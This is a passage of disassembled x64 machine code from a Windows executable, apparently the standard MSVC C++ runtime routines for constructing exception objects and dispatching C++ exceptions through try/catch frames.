   140003a24:	e8 87 07 00 00       	call   0x1400041b0
   140003a29:	48 8d 05 20 b9 00 00 	lea    0xb920(%rip),%rax        # 0x14000f350
   140003a30:	48 89 03             	mov    %rax,(%rbx)
   140003a33:	48 8b c3             	mov    %rbx,%rax
   140003a36:	48 83 c4 20          	add    $0x20,%rsp
   140003a3a:	5b                   	pop    %rbx
   140003a3b:	c3                   	ret
   140003a3c:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140003a41:	48 8d 05 18 b9 00 00 	lea    0xb918(%rip),%rax        # 0x14000f360
   140003a48:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140003a4c:	48 8d 05 fd b8 00 00 	lea    0xb8fd(%rip),%rax        # 0x14000f350
   140003a53:	48 89 01             	mov    %rax,(%rcx)
   140003a56:	48 8b c1             	mov    %rcx,%rax
   140003a59:	c3                   	ret
   140003a5a:	cc                   	int3
   140003a5b:	cc                   	int3
   140003a5c:	40 53                	rex push %rbx
   140003a5e:	48 83 ec 20          	sub    $0x20,%rsp
   140003a62:	48 8b d9             	mov    %rcx,%rbx
   140003a65:	48 8b c2             	mov    %rdx,%rax
   140003a68:	48 8d 0d b1 b8 00 00 	lea    0xb8b1(%rip),%rcx        # 0x14000f320
   140003a6f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003a72:	48 89 0b             	mov    %rcx,(%rbx)
   140003a75:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140003a79:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003a7d:	0f 11 02             	movups %xmm0,(%rdx)
   140003a80:	e8 2b 07 00 00       	call   0x1400041b0
   140003a85:	48 8b c3             	mov    %rbx,%rax
   140003a88:	48 83 c4 20          	add    $0x20,%rsp
   140003a8c:	5b                   	pop    %rbx
   140003a8d:	c3                   	ret
   140003a8e:	cc                   	int3
   140003a8f:	cc                   	int3
   140003a90:	48 8d 05 89 b8 00 00 	lea    0xb889(%rip),%rax        # 0x14000f320
   140003a97:	48 89 01             	mov    %rax,(%rcx)
   140003a9a:	48 83 c1 08          	add    $0x8,%rcx
   140003a9e:	e9 9d 07 00 00       	jmp    0x140004240
   140003aa3:	cc                   	int3
   140003aa4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003aa9:	57                   	push   %rdi
   140003aaa:	48 83 ec 20          	sub    $0x20,%rsp
   140003aae:	48 8d 05 6b b8 00 00 	lea    0xb86b(%rip),%rax        # 0x14000f320
   140003ab5:	48 8b f9             	mov    %rcx,%rdi
   140003ab8:	48 89 01             	mov    %rax,(%rcx)
   140003abb:	8b da                	mov    %edx,%ebx
   140003abd:	48 83 c1 08          	add    $0x8,%rcx
   140003ac1:	e8 7a 07 00 00       	call   0x140004240
   140003ac6:	f6 c3 01             	test   $0x1,%bl
   140003ac9:	74 0d                	je     0x140003ad8
   140003acb:	ba 18 00 00 00       	mov    $0x18,%edx
   140003ad0:	48 8b cf             	mov    %rdi,%rcx
   140003ad3:	e8 18 91 00 00       	call   0x14000cbf0
   140003ad8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003add:	48 8b c7             	mov    %rdi,%rax
   140003ae0:	48 83 c4 20          	add    $0x20,%rsp
   140003ae4:	5f                   	pop    %rdi
   140003ae5:	c3                   	ret
   140003ae6:	cc                   	int3
   140003ae7:	cc                   	int3
   140003ae8:	40 53                	rex push %rbx
   140003aea:	56                   	push   %rsi
   140003aeb:	57                   	push   %rdi
   140003aec:	41 54                	push   %r12
   140003aee:	41 55                	push   %r13
   140003af0:	41 56                	push   %r14
   140003af2:	41 57                	push   %r15
   140003af4:	48 83 ec 70          	sub    $0x70,%rsp
   140003af8:	48 8b f9             	mov    %rcx,%rdi
   140003afb:	45 33 ff             	xor    %r15d,%r15d
   140003afe:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140003b03:	44 21 bc 24 b0 00 00 	and    %r15d,0xb0(%rsp)
   140003b0a:	00 
   140003b0b:	4c 21 7c 24 28       	and    %r15,0x28(%rsp)
   140003b10:	4c 21 bc 24 c8 00 00 	and    %r15,0xc8(%rsp)
   140003b17:	00 
   140003b18:	e8 0f e5 ff ff       	call   0x14000202c
   140003b1d:	4c 8b 68 28          	mov    0x28(%rax),%r13
   140003b21:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   140003b26:	e8 01 e5 ff ff       	call   0x14000202c
   140003b2b:	48 8b 40 20          	mov    0x20(%rax),%rax
   140003b2f:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   140003b36:	00 
   140003b37:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   140003b3b:	48 89 b4 24 b8 00 00 	mov    %rsi,0xb8(%rsp)
   140003b42:	00 
   140003b43:	48 8b 47 48          	mov    0x48(%rdi),%rax
   140003b47:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003b4c:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   140003b50:	48 8b 47 30          	mov    0x30(%rdi),%rax
   140003b54:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003b59:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   140003b5d:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140003b62:	48 8b cb             	mov    %rbx,%rcx
   140003b65:	e8 6a e4 ff ff       	call   0x140001fd4
   140003b6a:	e8 bd e4 ff ff       	call   0x14000202c
   140003b6f:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140003b73:	e8 b4 e4 ff ff       	call   0x14000202c
   140003b78:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140003b7c:	e8 ab e4 ff ff       	call   0x14000202c
   140003b81:	48 8b 50 20          	mov    0x20(%rax),%rdx
   140003b85:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   140003b89:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003b8e:	e8 91 ed ff ff       	call   0x140002924
   140003b93:	4c 8b e0             	mov    %rax,%r12
   140003b96:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003b9b:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   140003b9f:	74 1c                	je     0x140003bbd
   140003ba1:	c7 84 24 b0 00 00 00 	movl   $0x1,0xb0(%rsp)
   140003ba8:	01 00 00 00 
   140003bac:	e8 7b e4 ff ff       	call   0x14000202c
   140003bb1:	48 8b 48 70          	mov    0x70(%rax),%rcx
   140003bb5:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   140003bbc:	00 
   140003bbd:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140003bc3:	49 8b d6             	mov    %r14,%rdx
   140003bc6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003bcb:	e8 a0 05 00 00       	call   0x140004170
   140003bd0:	48 8b d8             	mov    %rax,%rbx
   140003bd3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003bd8:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140003bdf:	00 
   140003be0:	eb 78                	jmp    0x140003c5a
   140003be2:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003be9:	00 
   140003bea:	e8 3d e4 ff ff       	call   0x14000202c
   140003bef:	83 60 40 00          	andl   $0x0,0x40(%rax)
   140003bf3:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
   140003bfa:	00 
   140003bfb:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   140003c02:	00 
   140003c03:	74 21                	je     0x140003c26
   140003c05:	b2 01                	mov    $0x1,%dl
   140003c07:	48 8b ce             	mov    %rsi,%rcx
   140003c0a:	e8 f5 e1 ff ff       	call   0x140001e04
   140003c0f:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   140003c16:	00 
   140003c17:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   140003c1b:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   140003c1f:	8b 51 04             	mov    0x4(%rcx),%edx
   140003c22:	8b 09                	mov    (%rcx),%ecx
   140003c24:	eb 0d                	jmp    0x140003c33
   140003c26:	4c 8d 4e 20          	lea    0x20(%rsi),%r9
   140003c2a:	44 8b 46 18          	mov    0x18(%rsi),%r8d
   140003c2e:	8b 56 04             	mov    0x4(%rsi),%edx
   140003c31:	8b 0e                	mov    (%rsi),%ecx
   140003c33:	ff 15 c7 a4 00 00    	call   *0xa4c7(%rip)        # 0x14000e100
   140003c39:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   140003c3e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140003c43:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140003c48:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140003c4f:	00 
   140003c50:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140003c55:	4c 8b 64 24 38       	mov    0x38(%rsp),%r12
   140003c5a:	49 8b cc             	mov    %r12,%rcx
   140003c5d:	e8 fe ec ff ff       	call   0x140002960
   140003c62:	45 85 ff             	test   %r15d,%r15d
   140003c65:	75 32                	jne    0x140003c99
   140003c67:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   140003c6d:	75 2a                	jne    0x140003c99
   140003c6f:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   140003c73:	75 24                	jne    0x140003c99
   140003c75:	8b 46 20             	mov    0x20(%rsi),%eax
   140003c78:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140003c7d:	83 f8 02             	cmp    $0x2,%eax
   140003c80:	77 17                	ja     0x140003c99
   140003c82:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140003c86:	e8 ed e1 ff ff       	call   0x140001e78
   140003c8b:	85 c0                	test   %eax,%eax
   140003c8d:	74 0a                	je     0x140003c99
   140003c8f:	b2 01                	mov    $0x1,%dl
   140003c91:	48 8b ce             	mov    %rsi,%rcx
   140003c94:	e8 6b e1 ff ff       	call   0x140001e04
   140003c99:	e8 8e e3 ff ff       	call   0x14000202c
   140003c9e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003ca2:	e8 85 e3 ff ff       	call   0x14000202c
   140003ca7:	4c 89 68 28          	mov    %r13,0x28(%rax)
   140003cab:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003cb0:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   140003cb4:	49 8b 06             	mov    (%r14),%rax
   140003cb7:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   140003cbe:	ff 
   140003cbf:	48 8b c3             	mov    %rbx,%rax
   140003cc2:	48 83 c4 70          	add    $0x70,%rsp
   140003cc6:	41 5f                	pop    %r15
   140003cc8:	41 5e                	pop    %r14
   140003cca:	41 5d                	pop    %r13
   140003ccc:	41 5c                	pop    %r12
   140003cce:	5f                   	pop    %rdi
   140003ccf:	5e                   	pop    %rsi
   140003cd0:	5b                   	pop    %rbx
   140003cd1:	c3                   	ret
   140003cd2:	cc                   	int3
   140003cd3:	cc                   	int3
   140003cd4:	40 53                	rex push %rbx
   140003cd6:	48 83 ec 20          	sub    $0x20,%rsp
   140003cda:	4c 8b 09             	mov    (%rcx),%r9
   140003cdd:	49 8b d8             	mov    %r8,%rbx
   140003ce0:	41 83 20 00          	andl   $0x0,(%r8)
   140003ce4:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140003ce9:	41 39 09             	cmp    %ecx,(%r9)
   140003cec:	75 61                	jne    0x140003d4f
   140003cee:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140003cf3:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   140003cf9:	75 1c                	jne    0x140003d17
   140003cfb:	41 8b 41 20          	mov    0x20(%r9),%eax
   140003cff:	41 2b c0             	sub    %r8d,%eax
   140003d02:	83 f8 02             	cmp    $0x2,%eax
   140003d05:	77 10                	ja     0x140003d17
   140003d07:	48 8b 42 28          	mov    0x28(%rdx),%rax
   140003d0b:	49 39 41 28          	cmp    %rax,0x28(%r9)
   140003d0f:	75 06                	jne    0x140003d17
   140003d11:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140003d17:	41 39 09             	cmp    %ecx,(%r9)
   140003d1a:	75 33                	jne    0x140003d4f
   140003d1c:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140003d21:	75 2c                	jne    0x140003d4f
   140003d23:	41 8b 49 20          	mov    0x20(%r9),%ecx
   140003d27:	41 2b c8             	sub    %r8d,%ecx
   140003d2a:	83 f9 02             	cmp    $0x2,%ecx
   140003d2d:	77 20                	ja     0x140003d4f
   140003d2f:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   140003d34:	75 19                	jne    0x140003d4f
   140003d36:	e8 f1 e2 ff ff       	call   0x14000202c
   140003d3b:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   140003d42:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d47:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140003d4d:	eb 02                	jmp    0x140003d51
   140003d4f:	33 c0                	xor    %eax,%eax
   140003d51:	48 83 c4 20          	add    $0x20,%rsp
   140003d55:	5b                   	pop    %rbx
   140003d56:	c3                   	ret
   140003d57:	cc                   	int3
   140003d58:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140003d5d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003d62:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003d67:	53                   	push   %rbx
   140003d68:	56                   	push   %rsi
   140003d69:	57                   	push   %rdi
   140003d6a:	41 54                	push   %r12
   140003d6c:	41 55                	push   %r13
   140003d6e:	41 56                	push   %r14
   140003d70:	41 57                	push   %r15
   140003d72:	48 83 ec 30          	sub    $0x30,%rsp
   140003d76:	45 8b e1             	mov    %r9d,%r12d
   140003d79:	49 8b f0             	mov    %r8,%rsi
   140003d7c:	48 8b da             	mov    %rdx,%rbx
   140003d7f:	4c 8b f9             	mov    %rcx,%r15
   140003d82:	e8 2d ec ff ff       	call   0x1400029b4
   140003d87:	4c 8b e8             	mov    %rax,%r13
   140003d8a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003d8f:	4c 8b c6             	mov    %rsi,%r8
   140003d92:	48 8b d3             	mov    %rbx,%rdx
   140003d95:	49 8b cf             	mov    %r15,%rcx
   140003d98:	e8 03 ed ff ff       	call   0x140002aa0
   140003d9d:	8b f8                	mov    %eax,%edi
   140003d9f:	e8 88 e2 ff ff       	call   0x14000202c
   140003da4:	ff 40 30             	incl   0x30(%rax)
   140003da7:	83 ff ff             	cmp    $0xffffffff,%edi
   140003daa:	0f 84 eb 00 00 00    	je     0x140003e9b
   140003db0:	41 3b fc             	cmp    %r12d,%edi
   140003db3:	0f 8e e2 00 00 00    	jle    0x140003e9b
   140003db9:	83 ff ff             	cmp    $0xffffffff,%edi
   140003dbc:	0f 8e 14 01 00 00    	jle    0x140003ed6
   140003dc2:	3b 7e 04             	cmp    0x4(%rsi),%edi
   140003dc5:	0f 8d 0b 01 00 00    	jge    0x140003ed6
   140003dcb:	4c 63 f7             	movslq %edi,%r14
   140003dce:	e8 e1 eb ff ff       	call   0x1400029b4
   140003dd3:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003dd7:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003ddb:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   140003dde:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140003de2:	e8 cd eb ff ff       	call   0x1400029b4
   140003de7:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003deb:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003def:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140003df4:	74 1c                	je     0x140003e12
   140003df6:	e8 b9 eb ff ff       	call   0x1400029b4
   140003dfb:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003dff:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003e03:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   140003e08:	e8 a7 eb ff ff       	call   0x1400029b4
   140003e0d:	48 03 c3             	add    %rbx,%rax
   140003e10:	eb 02                	jmp    0x140003e14
   140003e12:	33 c0                	xor    %eax,%eax
   140003e14:	48 85 c0             	test   %rax,%rax
   140003e17:	74 59                	je     0x140003e72
   140003e19:	44 8b c7             	mov    %edi,%r8d
   140003e1c:	48 8b d6             	mov    %rsi,%rdx
   140003e1f:	49 8b cf             	mov    %r15,%rcx
   140003e22:	e8 cd ec ff ff       	call   0x140002af4
   140003e27:	e8 88 eb ff ff       	call   0x1400029b4
   140003e2c:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003e30:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003e34:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   140003e39:	74 1c                	je     0x140003e57
   140003e3b:	e8 74 eb ff ff       	call   0x1400029b4
   140003e40:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140003e44:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003e48:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   140003e4d:	e8 62 eb ff ff       	call   0x1400029b4
   140003e52:	48 03 c3             	add    %rbx,%rax
   140003e55:	eb 02                	jmp    0x140003e59
   140003e57:	33 c0                	xor    %eax,%eax
   140003e59:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   140003e5f:	49 8b d7             	mov    %r15,%rdx
   140003e62:	48 8b c8             	mov    %rax,%rcx
   140003e65:	e8 06 03 00 00       	call   0x140004170
   140003e6a:	49 8b cd             	mov    %r13,%rcx
   140003e6d:	e8 6a eb ff ff       	call   0x1400029dc
   140003e72:	eb 1e                	jmp    0x140003e92
   140003e74:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
   140003e7b:	00 
   140003e7c:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140003e83:	00 
   140003e84:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140003e89:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140003e8e:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140003e92:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140003e96:	e9 0c ff ff ff       	jmp    0x140003da7
   140003e9b:	e8 8c e1 ff ff       	call   0x14000202c
   140003ea0:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140003ea4:	7e 08                	jle    0x140003eae
   140003ea6:	e8 81 e1 ff ff       	call   0x14000202c
   140003eab:	ff 48 30             	decl   0x30(%rax)
   140003eae:	83 ff ff             	cmp    $0xffffffff,%edi
   140003eb1:	74 05                	je     0x140003eb8
   140003eb3:	41 3b fc             	cmp    %r12d,%edi
   140003eb6:	7f 24                	jg     0x140003edc
   140003eb8:	44 8b c7             	mov    %edi,%r8d
   140003ebb:	48 8b d6             	mov    %rsi,%rdx
   140003ebe:	49 8b cf             	mov    %r15,%rcx
   140003ec1:	e8 2e ec ff ff       	call   0x140002af4
   140003ec6:	48 83 c4 30          	add    $0x30,%rsp
   140003eca:	41 5f                	pop    %r15
   140003ecc:	41 5e                	pop    %r14
   140003ece:	41 5d                	pop    %r13
   140003ed0:	41 5c                	pop    %r12
   140003ed2:	5f                   	pop    %rdi
   140003ed3:	5e                   	pop    %rsi
   140003ed4:	5b                   	pop    %rbx
   140003ed5:	c3                   	ret
   140003ed6:	e8 ed 17 00 00       	call   0x1400056c8
   140003edb:	90                   	nop
   140003edc:	e8 e7 17 00 00       	call   0x1400056c8
   140003ee1:	90                   	nop
   140003ee2:	cc                   	int3
   140003ee3:	cc                   	int3
   140003ee4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ee9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003eee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003ef3:	57                   	push   %rdi
   140003ef4:	48 83 ec 20          	sub    $0x20,%rsp
   140003ef8:	48 8b e9             	mov    %rcx,%rbp
   140003efb:	49 8b f8             	mov    %r8,%rdi
   140003efe:	49 8b c8             	mov    %r8,%rcx
   140003f01:	48 8b f2             	mov    %rdx,%rsi
   140003f04:	e8 33 ec ff ff       	call   0x140002b3c
   140003f09:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140003f0e:	4c 8b c7             	mov    %rdi,%r8
   140003f11:	48 8b d6             	mov    %rsi,%rdx
   140003f14:	48 8b cd             	mov    %rbp,%rcx
   140003f17:	8b d8                	mov    %eax,%ebx
   140003f19:	e8 fe e6 ff ff       	call   0x14000261c
   140003f1e:	4c 8b c7             	mov    %rdi,%r8
   140003f21:	48 8b d6             	mov    %rsi,%rdx
   140003f24:	48 8b cd             	mov    %rbp,%rcx
   140003f27:	e8 9c eb ff ff       	call   0x140002ac8
   140003f2c:	3b d8                	cmp    %eax,%ebx
   140003f2e:	7e 23                	jle    0x140003f53
   140003f30:	44 8b c3             	mov    %ebx,%r8d
   140003f33:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003f38:	48 8b d7             	mov    %rdi,%rdx
   140003f3b:	e8 b4 eb ff ff       	call   0x140002af4
   140003f40:	44 8b cb             	mov    %ebx,%r9d
   140003f43:	4c 8b c7             	mov    %rdi,%r8
   140003f46:	48 8b d6             	mov    %rsi,%rdx
   140003f49:	48 8b cd             	mov    %rbp,%rcx
   140003f4c:	e8 af eb ff ff       	call   0x140002b00
   140003f51:	eb 10                	jmp    0x140003f63
   140003f53:	4c 8b c7             	mov    %rdi,%r8
   140003f56:	48 8b d6             	mov    %rsi,%rdx
   140003f59:	48 8b cd             	mov    %rbp,%rcx
   140003f5c:	e8 67 eb ff ff       	call   0x140002ac8
   140003f61:	8b d8                	mov    %eax,%ebx
   140003f63:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003f68:	8b c3                	mov    %ebx,%eax
   140003f6a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003f6f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003f74:	48 83 c4 20          	add    $0x20,%rsp
   140003f78:	5f                   	pop    %rdi
   140003f79:	c3                   	ret
   140003f7a:	cc                   	int3
   140003f7b:	cc                   	int3
   140003f7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f81:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003f86:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003f8b:	57                   	push   %rdi
   140003f8c:	41 54                	push   %r12
   140003f8e:	41 55                	push   %r13
   140003f90:	41 56                	push   %r14
   140003f92:	41 57                	push   %r15
   140003f94:	48 83 ec 20          	sub    $0x20,%rsp
   140003f98:	48 8b ea             	mov    %rdx,%rbp
   140003f9b:	4c 8b e9             	mov    %rcx,%r13
   140003f9e:	48 85 d2             	test   %rdx,%rdx
   140003fa1:	0f 84 bc 00 00 00    	je     0x140004063
   140003fa7:	45 32 ff             	xor    %r15b,%r15b
   140003faa:	33 f6                	xor    %esi,%esi
   140003fac:	39 32                	cmp    %esi,(%rdx)
   140003fae:	0f 8e 8f 00 00 00    	jle    0x140004043
   140003fb4:	e8 0f ea ff ff       	call   0x1400029c8
   140003fb9:	48 8b d0             	mov    %rax,%rdx
   140003fbc:	49 8b 45 30          	mov    0x30(%r13),%rax
   140003fc0:	4c 63 60 0c          	movslq 0xc(%rax),%r12
   140003fc4:	49 83 c4 04          	add    $0x4,%r12
   140003fc8:	4c 03 e2             	add    %rdx,%r12
   140003fcb:	e8 f8 e9 ff ff       	call   0x1400029c8
   140003fd0:	48 8b d0             	mov    %rax,%rdx
   140003fd3:	49 8b 45 30          	mov    0x30(%r13),%rax
   140003fd7:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   140003fdb:	44 8b 34 0a          	mov    (%rdx,%rcx,1),%r14d
   140003fdf:	45 85 f6             	test   %r14d,%r14d
   140003fe2:	7e 54                	jle    0x140004038
   140003fe4:	48 63 c6             	movslq %esi,%rax
   140003fe7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140003feb:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003ff0:	e8 d3 e9 ff ff       	call   0x1400029c8
   140003ff5:	49 8b 5d 30          	mov    0x30(%r13),%rbx
   140003ff9:	48 8b f8             	mov    %rax,%rdi
   140003ffc:	49 63 04 24          	movslq (%r12),%rax
   140004000:	48 03 f8             	add    %rax,%rdi
   140004003:	e8 ac e9 ff ff       	call   0x1400029b4
   140004008:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   14000400d:	4c 8b c3             	mov    %rbx,%r8
   140004010:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   140004014:	48 8d 04 90          	lea    (%rax,%rdx,4),%rax
   140004018:	48 8b d7             	mov    %rdi,%rdx
   14000401b:	48 03 c8             	add    %rax,%rcx
   14000401e:	e8 5d f6 ff ff       	call   0x140003680
   140004023:	85 c0                	test   %eax,%eax
   140004025:	75 0e                	jne    0x140004035
   140004027:	41 ff ce             	dec    %r14d
   14000402a:	49 83 c4 04          	add    $0x4,%r12
   14000402e:	45 85 f6             	test   %r14d,%r14d
   140004031:	7f bd                	jg     0x140003ff0
   140004033:	eb 03                	jmp    0x140004038
   140004035:	41 b7 01             	mov    $0x1,%r15b
   140004038:	ff c6                	inc    %esi
   14000403a:	3b 75 00             	cmp    0x0(%rbp),%esi
   14000403d:	0f 8c 71 ff ff ff    	jl     0x140003fb4
   140004043:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004048:	41 8a c7             	mov    %r15b,%al
   14000404b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140004050:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140004055:	48 83 c4 20          	add    $0x20,%rsp
   140004059:	41 5f                	pop    %r15
   14000405b:	41 5e                	pop    %r14
   14000405d:	41 5d                	pop    %r13
   14000405f:	41 5c                	pop    %r12
   140004061:	5f                   	pop    %rdi
   140004062:	c3                   	ret
   140004063:	e8 60 16 00 00       	call   0x1400056c8
   140004068:	cc                   	int3
   140004069:	cc                   	int3
   14000406a:	cc                   	int3
   14000406b:	cc                   	int3
   14000406c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004071:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004076:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000407b:	57                   	push   %rdi
   14000407c:	48 83 ec 20          	sub    $0x20,%rsp
   140004080:	33 ed                	xor    %ebp,%ebp
   140004082:	48 8b f9             	mov    %rcx,%rdi
   140004085:	39 29                	cmp    %ebp,(%rcx)
   140004087:	7e 50                	jle    0x1400040d9
   140004089:	33 f6                	xor    %esi,%esi
   14000408b:	e8 24 e9 ff ff       	call   0x1400029b4
   140004090:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   140004094:	48 03 c6             	add    %rsi,%rax
   140004097:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   14000409c:	74 1b                	je     0x1400040b9
   14000409e:	e8 11 e9 ff ff       	call   0x1400029b4
   1400040a3:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   1400040a7:	48 03 c6             	add    %rsi,%rax
   1400040aa:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   1400040af:	e8 00 e9 ff ff       	call   0x1400029b4
   1400040b4:	48 03 c3             	add    %rbx,%rax
   1400040b7:	eb 02                	jmp    0x1400040bb
   1400040b9:	33 c0                	xor    %eax,%eax
   1400040bb:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400040bf:	48 8d 15 a2 49 01 00 	lea    0x149a2(%rip),%rdx        # 0x140018a68
   1400040c6:	e8 11 dd ff ff       	call   0x140001ddc
   1400040cb:	85 c0                	test   %eax,%eax
   1400040cd:	74 21                	je     0x1400040f0
   1400040cf:	ff c5                	inc    %ebp
   1400040d1:	48 83 c6 14          	add    $0x14,%rsi
   1400040d5:	3b 2f                	cmp    (%rdi),%ebp
   1400040d7:	7c b2                	jl     0x14000408b
   1400040d9:	32 c0                	xor    %al,%al
   1400040db:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040e0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400040e5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400040ea:	48 83 c4 20          	add    $0x20,%rsp
   1400040ee:	5f                   	pop    %rdi
   1400040ef:	c3                   	ret
   1400040f0:	b0 01                	mov    $0x1,%al
   1400040f2:	eb e7                	jmp    0x1400040db
   1400040f4:	48 8b c2             	mov    %rdx,%rax
   1400040f7:	49 8b d0             	mov    %r8,%rdx
   1400040fa:	48 ff e0             	rex.W jmp *%rax
   1400040fd:	cc                   	int3
   1400040fe:	cc                   	int3
   1400040ff:	cc                   	int3
   140004100:	49 8b c0             	mov    %r8,%rax
   140004103:	4c 8b d2             	mov    %rdx,%r10
   140004106:	48 8b d0             	mov    %rax,%rdx
   140004109:	45 8b c1             	mov    %r9d,%r8d
   14000410c:	49 ff e2             	rex.WB jmp *%r10
   14000410f:	cc                   	int3
   140004110:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140004115:	48 8d 05 14 b2 00 00 	lea    0xb214(%rip),%rax        # 0x14000f330
   14000411c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140004121:	c3                   	ret
   140004122:	cc                   	int3
   140004123:	cc                   	int3
   140004124:	cc                   	int3
   140004125:	cc                   	int3
